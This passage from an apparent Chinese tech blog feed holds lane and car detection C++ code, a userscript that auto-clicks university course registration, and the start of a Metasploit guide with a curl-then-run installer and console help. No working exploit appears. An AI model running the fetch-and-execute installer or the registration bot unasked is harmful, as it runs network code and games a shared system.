			lane = lanedetector.regression(left_right_lines, frame);
			//消失点预测方向
			turn = lanedetector.predictTurn();
			//航向输出
			cout&amp;lt;&amp;lt;turn&amp;lt;&amp;lt;endl;
			//渲染
			flag_plot = lanedetector.plotLane(frame, lane, turn);
			cv::waitKey(25);
		}
		else {
			flag_plot = -1;
		}
	}
	return flag_plot;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;lane_detect.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 18:45:15 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-17 18:46:14
 */
#include &amp;lt;string&amp;gt;
#include &amp;lt;opencv2/opencv.hpp&amp;gt;
class LaneDetector 
{
private:
	double img_size;
	double img_center;
    // 左边界
	bool left_flag = false;  
    // 右边界
	bool right_flag = false;
    // 车道线方程  
    // y = m*x + b
	cv::Point right_b;  
	double right_m;  
	cv::Point left_b; 
	double left_m;  

public:
    //高斯模糊
	cv::Mat deNoise(cv::Mat inputImage);  
    // 边缘提取
	cv::Mat edgeDetector(cv::Mat img_noise);
    // ROI  
	cv::Mat mask(cv::Mat img_edges);  
    // 霍夫线检测
	std::vector&amp;lt;cv::Vec4i&amp;gt; houghLines(cv::Mat img_mask);  
    //路线提取
	std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; lineSeparation(std::vector&amp;lt;cv::Vec4i&amp;gt; lines, cv::Mat img_edges);  
    //车道线获取,一条
	std::vector&amp;lt;cv::Point&amp;gt; regression(std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines, cv::Mat inputImage);  
    // 转向决策，消失点决策
	std::string predictTurn();  
    // 渲染绘画
	int plotLane(cv::Mat inputImage, std::vector&amp;lt;cv::Point&amp;gt; lane, std::string turn);  
};

cv::Mat LaneDetector::deNoise(cv::Mat inputImage) {
	cv::Mat output;
	cv::GaussianBlur(inputImage, output, cv::Size(3, 3), 0, 0);
	return output;
}

cv::Mat LaneDetector::edgeDetector(cv::Mat img_noise) {
	cv::Mat output;
	cv::Mat kernel;
	cv::Point anchor;

	//灰度化
	cv::cvtColor(img_noise, output, cv::COLOR_RGB2GRAY);
	// 二值化
	cv::threshold(output, output, 140, 255, cv::THRESH_BINARY);

    // 偏离警告
	anchor = cv::Point(-1, -1);
	kernel = cv::Mat(1, 3, CV_32F);
	kernel.at&amp;lt;float&amp;gt;(0, 0) = -1;
	kernel.at&amp;lt;float&amp;gt;(0, 1) = 0;
	kernel.at&amp;lt;float&amp;gt;(0, 2) = 1;

	//边缘提取
	cv::filter2D(output, output, -1, kernel, anchor, 0, cv::BORDER_DEFAULT);
	// cv::imshow(&quot;output&quot;, output);
	return output;
}

cv::Mat LaneDetector::mask(cv::Mat img_edges) {
	cv::Mat output;
    // 创建mask
	cv::Mat mask = cv::Mat::zeros(img_edges.size(), img_edges.type());
	// 定位点
    cv::Point pts[4] = {
		cv::Point(210, 720),
		cv::Point(550, 450),
		cv::Point(717, 450),
		cv::Point(1280, 720)
	};
    // 区域填充
	cv::fillConvexPoly(mask, pts, 4, cv::Scalar(255, 0, 0));
	//图像和mask相乘输出
	cv::bitwise_and(img_edges, mask, output);
	return output;
}

//霍夫直线检测
std::vector&amp;lt;cv::Vec4i&amp;gt; LaneDetector::houghLines(cv::Mat img_mask) {
	std::vector&amp;lt;cv::Vec4i&amp;gt; line;
	HoughLinesP(img_mask, line, 1, CV_PI / 180, 20, 20, 30);

	return line;
}
//路线提取
//过滤line
//左右两条line
std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; LaneDetector::lineSeparation(std::vector&amp;lt;cv::Vec4i&amp;gt; lines, cv::Mat img_edges) {
	std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; output(2);
	size_t j = 0;
	cv::Point ini;
	cv::Point fini;
    //斜率限制阈值
	double slope_thresh = 0.3;
	std::vector&amp;lt;double&amp;gt; slopes;
	std::vector&amp;lt;cv::Vec4i&amp;gt; selected_lines;
	std::vector&amp;lt;cv::Vec4i&amp;gt; right_lines, left_lines;

	// 斜率计算
	for (auto i : lines) {
		ini = cv::Point(i[0], i[1]);
		fini = cv::Point(i[2], i[3]);

		// m = (y1 - y0)/(x1 - x0)
		double slope = (static_cast&amp;lt;double&amp;gt;(fini.y) - static_cast&amp;lt;double&amp;gt;(ini.y)) / (static_cast&amp;lt;double&amp;gt;(fini.x) - static_cast&amp;lt;double&amp;gt;(ini.x) + 0.00001);

		//如果小于限制阈值，则去除
        //保存大于限制阈值的线
		if (std::abs(slope) &amp;gt; slope_thresh) {
			slopes.push_back(slope);
			selected_lines.push_back(i);
		}
	}

	// 区分左右线
	img_center = static_cast&amp;lt;double&amp;gt;((img_edges.cols / 2));
	while (j &amp;lt; selected_lines.size()) {
		ini = cv::Point(selected_lines[j][0], selected_lines[j][1]);
		fini = cv::Point(selected_lines[j][2], selected_lines[j][3]);

		// 如果斜率大于０且fini.x和fini大于图像中心点,则判断为左侧,反之右侧
		if (slopes[j] &amp;gt; 0 &amp;amp;&amp;amp; fini.x &amp;gt; img_center &amp;amp;&amp;amp; ini.x &amp;gt; img_center) {
			right_lines.push_back(selected_lines[j]);
			right_flag = true;
		}
		else if (slopes[j] &amp;lt; 0 &amp;amp;&amp;amp; fini.x &amp;lt; img_center &amp;amp;&amp;amp; ini.x &amp;lt; img_center) {
			left_lines.push_back(selected_lines[j]);
			left_flag = true;
		}
		j++;
	}

	output[0] = right_lines;
	output[1] = left_lines;

	return output;
}

//最终车道线选择
std::vector&amp;lt;cv::Point&amp;gt; LaneDetector::regression(std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines, cv::Mat inputImage) {
	std::vector&amp;lt;cv::Point&amp;gt; output(4);
	cv::Point ini;
	cv::Point fini;
	cv::Point ini2;
	cv::Point fini2;
	cv::Vec4d right_line;
	cv::Vec4d left_line;
	std::vector&amp;lt;cv::Point&amp;gt; right_pts;
	std::vector&amp;lt;cv::Point&amp;gt; left_pts;

	// 检测到右侧线，则把点给连上
	if (right_flag == true) {
		for (auto i : left_right_lines[0]) {
			ini = cv::Point(i[0], i[1]);
			fini = cv::Point(i[2], i[3]);

			right_pts.push_back(ini);
			right_pts.push_back(fini);
		}

		if (right_pts.size() &amp;gt; 0) {
			//拟合
			cv::fitLine(right_pts, right_line, CV_DIST_L2, 0, 0.01, 0.01);
			right_m = right_line[1] / right_line[0];
			right_b = cv::Point(right_line[2], right_line[3]);
		}
	}

	// 检测到左侧线，则把点给连上
	if (left_flag == true) {
		for (auto j : left_right_lines[1]) {
			ini2 = cv::Point(j[0], j[1]);
			fini2 = cv::Point(j[2], j[3]);

			left_pts.push_back(ini2);
			left_pts.push_back(fini2);
		}

		if (left_pts.size() &amp;gt; 0) {
			//拟合
			cv::fitLine(left_pts, left_line, CV_DIST_L2, 0, 0.01, 0.01);
			left_m = left_line[1] / left_line[0];
			left_b = cv::Point(left_line[2], left_line[3]);
		}
	}

	// 通过直线方程获得点
	int ini_y = inputImage.rows;
	int fin_y = 470;

	double right_ini_x = ((ini_y - right_b.y) / right_m) + right_b.x;
	double right_fin_x = ((fin_y - right_b.y) / right_m) + right_b.x;

	double left_ini_x = ((ini_y - left_b.y) / left_m) + left_b.x;
	double left_fin_x = ((fin_y - left_b.y) / left_m) + left_b.x;

	output[0] = cv::Point(right_ini_x, ini_y);
	output[1] = cv::Point(right_fin_x, fin_y);
	output[2] = cv::Point(left_ini_x, ini_y);
	output[3] = cv::Point(left_fin_x, fin_y);

	return output;
}


std::string LaneDetector::predictTurn() {
	std::string output;
	double vanish_x;
	double thr_vp = 10;

	//消失点:两直线交点
	vanish_x = static_cast&amp;lt;double&amp;gt;(((right_m*right_b.x) - (left_m*left_b.x) - right_b.y + left_b.y) / (right_m - left_m));

	//决策
	if (vanish_x &amp;lt; (img_center - thr_vp))
		output = &quot;Left Turn&quot;;
	else if (vanish_x &amp;gt;(img_center + thr_vp))
		output = &quot;Right Turn&quot;;
	else if (vanish_x &amp;gt;= (img_center - thr_vp) &amp;amp;&amp;amp; vanish_x &amp;lt;= (img_center + thr_vp))
		output = &quot;Straight&quot;;

	return output;
}

int LaneDetector::plotLane(cv::Mat inputImage, std::vector&amp;lt;cv::Point&amp;gt; lane, std::string turn) 
{
	std::vector&amp;lt;cv::Point&amp;gt; poly_points;
	cv::Mat output;

	//渲染内部
	inputImage.copyTo(output);
	poly_points.push_back(lane[2]);
	poly_points.push_back(lane[0]);
	poly_points.push_back(lane[1]);
	poly_points.push_back(lane[3]);
	cv::fillConvexPoly(output, poly_points, cv::Scalar(0, 0, 255), CV_AA, 0);
	cv::addWeighted(output, 0.3, inputImage, 1.0 - 0.3, 0, inputImage);

	//划线
	cv::line(inputImage, lane[0], lane[1], cv::Scalar(0, 255, 255), 5, CV_AA);
	cv::line(inputImage, lane[2], lane[3], cv::Scalar(0, 255, 255), 5, CV_AA);

	// 决策信息
	cv::putText(inputImage, turn, cv::Point(50, 90), cv::FONT_HERSHEY_COMPLEX_SMALL, 3, cvScalar(0, 255, 0), 1, CV_AA);

	cv::namedWindow(&quot;Lane&quot;, CV_WINDOW_AUTOSIZE);
	cv::imshow(&quot;Lane&quot;, inputImage);
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;yolo_car_detect.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 14:28:03 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-18 12:12:02
 */
#include &amp;lt;opencv2/dnn.hpp&amp;gt;
#include &amp;lt;opencv2/imgproc.hpp&amp;gt;
#include &amp;lt;opencv2/highgui.hpp&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;sstream&amp;gt;
#include &amp;lt;vector&amp;gt;

using namespace cv;
using namespace dnn;
using namespace std;

//置信度
float confThreshold = 0.5;
float nmsThreshold = 0.4;

//图片输入尺寸
//参看cfg配置文件
int inpWidth = 416;  
int inpHeight = 416; 
//配置文件
const string classesFile = &quot;../config/coco.names&quot;;
const string modelConfiguration = &quot;../config/yolov3-tiny.cfg&quot;;
const string modelWeights = &quot;../config/yolov3-tiny.weights&quot;;
//测试视频
cv::Mat img_denoise;
cv::Mat img_edges;
cv::Mat img_mask;
std::vector&amp;lt;cv::Vec4i&amp;gt; lines;
std::vector&amp;lt;std::vector&amp;lt;cv::Vec4i&amp;gt; &amp;gt; left_right_lines;
std::vector&amp;lt;cv::Point&amp;gt; lane;
std::string turn;
int flag_plot = -1;
int i = 0;
vector&amp;lt;string&amp;gt; classes;
// 删除置信度低的图片
void postprocess(Mat&amp;amp; frame, const vector&amp;lt;Mat&amp;gt;&amp;amp; out);

//画预测框
void drawPred(int classId, float conf, int left, int top, int right, int bottom, Mat&amp;amp; frame);

//获取分类
vector&amp;lt;String&amp;gt; getOutputsNames(const Net&amp;amp; net);

//config检测
size_t configFileDect()
{
	if(classesFile == NULL)
	{
		fprintf(stdout,&quot;classesFile is NULL\n&quot;);
		return 1;
	}
	if(modelConfiguration == NULL)
	{
		perror(&quot;modelConfiguration&quot;);
		return 1;
	}
	if(modelWeights == NULL)
	{
		perror(&quot;modelWeights&quot;);
		return 1;
	}
}


//抑制低置信度
void postprocess(Mat&amp;amp; frame, const vector&amp;lt;Mat&amp;gt;&amp;amp; outs)
{
    vector&amp;lt;int&amp;gt; classIds;
    vector&amp;lt;float&amp;gt; confidences;
    vector&amp;lt;Rect&amp;gt; boxes;
    // 遍历每一个box
    for (size_t i = 0; i &amp;lt; outs.size(); ++i)
    {
        float* data = (float*)outs[i].data;
        for (int j = 0; j &amp;lt; outs[i].rows; ++j, data += outs[i].cols)
        {
            Mat scores = outs[i].row(j).colRange(5, outs[i].cols);
            Point classIdPoint;
            double confidence;
            //获取score最大和最小值
            minMaxLoc(scores, 0, &amp;amp;confidence, 0, &amp;amp;classIdPoint);
            if (confidence &amp;gt; confThreshold)
            {
                int centerX = (int)(data[0] * frame.cols);
                int centerY = (int)(data[1] * frame.rows);
                int width = (int)(data[2] * frame.cols);
                int height = (int)(data[3] * frame.rows);
                int left = centerX - width / 2;
                int top = centerY - height / 2;
                
                classIds.push_back(classIdPoint.x);
                confidences.push_back((float)confidence);
                boxes.push_back(Rect(left, top, width, height));
            }
        }
    }
    
    vector&amp;lt;int&amp;gt; indices;
    NMSBoxes(boxes, confidences, confThreshold, nmsThreshold, indices);
    for (size_t i = 0; i &amp;lt; indices.size(); ++i)
    {
        int idx = indices[i];
        Rect box = boxes[idx];
        drawPred(classIds[idx], confidences[idx], box.x, box.y,
                 box.x + box.width, box.y + box.height, frame);
    }
}

//绘画渲染
void drawPred(int classId, float conf, int left, int top, int right, int bottom, Mat&amp;amp; frame)
{
    //矩形框
    rectangle(frame, Point(left, top), Point(right, bottom), Scalar(0, 255, 0), 3);
    
    //获取name和置信度
    string label = format(&quot;%.2f&quot;, conf);
    if (!classes.empty())
    {
        CV_Assert(classId &amp;lt; (int)classes.size());
        label = classes[classId] + &quot;:&quot; + label;
    }
    //说明
    int baseLine;
    Size labelSize = getTextSize(label, FONT_HERSHEY_SIMPLEX, 0.5, 1, &amp;amp;baseLine);
    top = max(top, labelSize.height);
    rectangle(frame, Point(left, top - round(1.5*labelSize.height)), Point(left + round(1.5*labelSize.width), top + baseLine), Scalar(255, 255, 255), FILLED);
    putText(frame, label, Point(left, top), FONT_HERSHEY_SIMPLEX, 0.75, Scalar(0,0,0),1);
}
//获取name
vector&amp;lt;String&amp;gt; getOutputsNames(const Net&amp;amp; net)
{
    static vector&amp;lt;String&amp;gt; names;
    if (names.empty())
    {
        vector&amp;lt;int&amp;gt; outLayers = net.getUnconnectedOutLayers();
        //获取所有name
        vector&amp;lt;String&amp;gt; layersNames = net.getLayerNames();
        //获取当前的name
        names.resize(outLayers.size());
        for (size_t i = 0; i &amp;lt; outLayers.size(); ++i)
        names[i] = layersNames[outLayers[i] - 1];
    }
    return names;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;安装使用&quot;&gt;安装使用&lt;/h1&gt;

&lt;h2 id=&quot;opencv配置&quot;&gt;opencv配置&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;建议使用3.4.5版本,其中 dnn 模块支持较好.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;下载链接&lt;/li&gt;
  &lt;li&gt;解压&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;unzip opencv- . . .zip
cd opencv- 3.4.5
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;安装cmake&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install cmake
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;依赖环境&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install build-essential libgtk . -dev libavcodec-dev libavformat-dev libjpeg-dev libswscale-
dev libtiff -dev
sudo apt-get install libgtk . -dev
sudo apt-get install pkg-config
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;建立build&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir build
cd build
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;cmake&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo cmake -D CMAKE_BUILD_TYPE=Release -D CMAKE_INSTALL_PREFIX=/usr/local ..
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;编译&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo make -j8
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;安装&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo make install
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;配置环境&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo gedit /etc/ld.so.conf
#添加 /usr/loacal/lib
sudo gedit /etc/bash.bashrc
#在文件末尾加入:
#PKG_CONFIG_PATH=$PKG_CONFIG_PATH:/usr/local/lib/pkgconfig
#export PKG_CONFIG_PATH
source /etc/bash.bashrc
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;dlib配置&quot;&gt;Dlib配置&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;安装libboost&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;sudo apt-get install libboost-all-dev
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;下载dlib&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/davisking/dlib.git
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;build&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd dlib
mkdir build; cd build; cmake .. -DDLIB_USE_CUDA=0 -DUSE_AVX_INSTRUCTIONS=1; cmake --build .
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;-DDLIB_USE_CUDA=0 不使用cuda&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;-DUSE_AVX_INSTRUCTIONS=1 使用cpu的AVX加速&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;python扩展&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd ..
python setup.py install --yes USE_AVX_INSTRUCTIONS --no DLIB_USE_CUDA
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;编译程序&quot;&gt;编译程序&lt;/h2&gt;

&lt;h3 id=&quot;fatiguedrivingdetection&quot;&gt;FatigueDrivingDetection&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd FatigueDrivingDetection
mkdir build
cd build/
cmake .. -DCMAKE_BUILD_TYPE=Release | tee ../log/cmake_log
make -j |tee ../log/make_log
chmod +x FatigueDrivingDe
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;lane_car_detect-1&quot;&gt;lane_car_detect&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cd lane_car_detect/
mkdir build
cd build
cmake ..
make
chmod +x lane_car_detect
./lane_car_detect
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="机器学习" /><summary type="html">[toc]</summary></entry><entry><title type="html">西华大学抢课脚本</title><link href="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/" rel="alternate" type="text/html" title="西华大学抢课脚本" /><published>2020-06-29T00:00:00+08:00</published><updated>2020-06-29T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-29-%E8%A5%BF%E5%8D%8E%E5%A4%A7%E5%AD%A6%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;环境配置&quot;&gt;环境配置&lt;/h1&gt;

&lt;p&gt;安装油猴插件&lt;/p&gt;

&lt;h1 id=&quot;脚本&quot;&gt;脚本&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// ==UserScript==
// @name         西华大学选课脚本
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://*/*
// @grant        none
// ==/UserScript==

(function () {
  'use strict';
  /**
   * 西华大学一键式选课脚本
   * 此脚本只能简单的代替你点击选课
   * 不保证成功率
   * 使用此脚本是您自愿使用的造成的损失作者概不负责·
   * @author WDF
   * 有问题请联系我
   * @QQ 2921235963
   */

  //把名字替换为你需要的课程名称
  let courseName = [&quot;足球&quot;, &quot;网球&quot;,&quot;桥牌&quot;]

  document.getElementsByClassName(&quot;panel panel-info&quot;)[0].getElementsByClassName(&quot;nav nav-tabs sl_nav_tabs&quot;)[0].getElementsByTagName(&quot;li&quot;)[1].getElementsByTagName(&quot;a&quot;)[0].click()

  let o = document.getElementById(&quot;more&quot;)
  for (let i = 0; i &amp;lt; 10; i++) {
    setTimeout(() =&amp;gt; {
      o.getElementsByTagName(&quot;a&quot;)[0].click()
    }, 1000)
  }

  let cnt = 0

  // 等待加载出课程
  setTimeout(() =&amp;gt; {
    console.log('loading...')

    //进入选课界面
    let courseList = document.getElementsByClassName(&quot;panel panel-info&quot;)
    for (let j = 0; j &amp;lt; courseName.length; j++) {
      cnt = cnt + 1
      if (j &amp;gt; 0)
        console.log(courseName[j - 1] + '选课成功!\n')

      console.log('当前准备选择的课程:' + courseName[j])
      let i
      // 搜索课程
      for (i = 1; i &amp;lt; courseList.length; i++) {
        setTimeout(() =&amp;gt; {
        }, 1000)

        let oo = courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0]
        let thisText = oo.getElementsByClassName(&quot;kcmc&quot;)[0].getElementsByTagName(&quot;a&quot;)[0].innerText

        if (courseName[j] == thisText) {
          courseList[i].getElementsByClassName(&quot;panel-heading kc_head&quot;)[0].getElementsByClassName(&quot;panel-title&quot;)[0].click()
          break;
        }
      }
      let flag = false
      let map = new Map()
      const timer = setInterval(() =&amp;gt; {
        if (flag)
          clearInterval(timer)
        // 获取当前课程列表
        let list = courseList[i].getElementsByClassName(&quot;panel-body table-responsive&quot;)[0].getElementsByClassName(&quot;table table-hover&quot;)[0].getElementsByClassName(&quot;body_tr&quot;)

        for (let k = 0; k &amp;lt; list.length; k++) {
          if (map.has(k))
            continue
          let o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-primary btn-sm&quot;)[0]
          if (o == null)
            o = list[k].getElementsByClassName(&quot;an&quot;)[0].getElementsByClassName(&quot;btn btn-danger btn-sm&quot;)[0]
          // console.log(k+&quot;---&quot;+o.innerText)
          if (o.innerText == &quot;选课&quot;) {
            o.click()
            setTimeout(() =&amp;gt; {
              let content = document.getElementsByClassName(&quot;modal-content&quot;)[0]
              if (content != null) {
                let message = content.getElementsByClassName(&quot;modal-body&quot;)[0].getElementsByClassName(&quot;bootbox-body&quot;)[0].getElementsByClassName(&quot;alert alert-modal&quot;)[0].innerText

                if (message == &quot;所选教学班的上课时间与其他教学班有冲突！&quot;)
                  map.set(k, '1')
                else if (message == &quot;一门课程最多可选1个志愿！&quot;)
                  clearInterval(timer)
                var ok_btn = content.getElementsByClassName(&quot;modal-footer ui-draggable-handle&quot;)[0].getElementsByClassName(&quot;btn btn-sm btn-default&quot;)[0]
                if (ok_btn != null)
                  ok_btn.click()
              }
            }, 750)
          } else {
            flag = true
            clearInterval(timer)
          }
          if (flag)
            break
        }
      }, 1500)

    }
  }, 2000)
  if (cnt == courseName.length)
    console.log('选课成功')


  // Your code here...
})();
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;感谢吴同学分享的脚本,[github](https://github.com/Sherlockouo/script/tree/master/study&lt;/p&gt;</content><author><name></name></author><category term="计算机网络" /><summary type="html">[toc]</summary></entry><entry><title type="html">metasploit使用总结</title><link href="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/" rel="alternate" type="text/html" title="metasploit使用总结" /><published>2020-06-27T00:00:00+08:00</published><updated>2020-06-27T00:00:00+08:00</updated><id>http://localhost:4000/_posts/metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93</id><content type="html" xml:base="http://localhost:4000/_posts/2020-06-27-metasploit%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;h2 id=&quot;官网地址&quot;&gt;&lt;a href=&quot;https://www.metasploit.com/&quot;&gt;官网地址&lt;/a&gt;&lt;/h2&gt;

&lt;h2 id=&quot;版本&quot;&gt;版本&lt;/h2&gt;

&lt;p&gt;Metasploit的四个版本：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Pro&lt;/strong&gt;：适用于渗透测试人员和IT安全团队&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Express&lt;/strong&gt;：适用于一般IT人员&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Community&lt;/strong&gt;：适用于小公司和学生&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Framework&lt;/strong&gt;：适用于开发人员和安全研究人员&lt;/p&gt;

&lt;h2 id=&quot;linux平台上安装&quot;&gt;Linux平台上安装&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; \
chmod 755 msfinstall &amp;amp;&amp;amp; \
./msfinstall
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;详细过程参考官网&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;初始化&quot;&gt;初始化&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;service postgresql start &amp;amp;&amp;amp; msfdb init &amp;amp;&amp;amp; msfconsole
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要是数据库初始化&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;metasploit结构&quot;&gt;Metasploit结构&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/home/admin233/博客/verylazycat.github.io/img/meta.png&quot; alt=&quot;meta&quot; /&gt;&lt;/h1&gt;

&lt;h2 id=&quot;目录结构&quot;&gt;目录结构&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;data目录：里面存放一些可编辑的文件，主要是给Metasploit使用
documentation目录：提供一些MSF的介绍文档等
external目录：源文件和第三方的库
lib目录：MSF框架的主要组成部分
modules目录：MSF的模块存放位置
plugins目录：存放Metasploit的插件
scripts目录：存放Meterpreter代码（shell code）或者是其他的脚本文件
tools目录：各种各样实用的命令行工具
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;help&quot;&gt;HELP&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    load          Load a framework plugin
    quit          Exit the console
    repeat        Repeat a list of commands
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    tips          Show a list of useful productivity tips
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    clearm        Clear the module stack
    info          Displays information about one or more modules
    listm         List the module stack
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    show          Displays modules of a given type, or all modules
    use           Interact with a module by name or search term/index


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    analyze           Analyze database information about a specific address or address range
    db_connect        Connect to an existing data service
    db_disconnect     Disconnect from the current data service
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
    db_remove         Remove the saved data service entry
    db_save           Save the current data service connection as the default to reconnect on startup
    db_status         Show the current data service status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


